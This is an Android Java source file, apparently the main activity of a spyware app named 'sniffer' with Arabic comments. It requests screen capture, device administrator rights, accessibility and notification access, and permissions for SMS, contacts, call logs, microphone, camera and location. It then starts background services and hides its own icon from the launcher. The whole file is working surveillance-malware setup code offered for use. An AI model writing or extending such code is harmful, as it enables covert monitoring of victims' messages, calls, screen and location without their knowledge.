package com.v8.global.sniffer;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;
    
    private String[] permissions = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        // 1. تسجيل الشاشة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(
                projectionManager.createScreenCaptureIntent(),
                REQUEST_MEDIA_PROJECTION
            );
        }
        
        // 2. تجاهل البطارية
        Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        batteryIntent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(batteryIntent);
        
        // 3. صلاحية الإشعارات
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        
        // 4. صلاحية الوصول
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        
        // 5. Admin Device
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(adminReceiver)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminReceiver);
            startActivity(adminIntent);
        }
        
        // 6. الأذونات العادية
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{permission}, REQUEST_CODE_PERMISSIONS);
            }
        }
        
        startServices();
    }

    private void startServices() {
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, AccessibilityControlService.class));
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK) {
            getSharedPreferences("screen_capture", MODE_PRIVATE)
                .edit()
                .putInt("resultCode", resultCode)
                .putString("data", data.toUri(0))
                .apply();
        }
        
        // إخفاء التطبيق بعد ثانيتين
        new android.os.Handler().postDelayed(() -> {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        }, 10000);
    }

    @Override
    protected void onResume() {
        super.onResume();
        moveTaskToBack(true);
    }
}
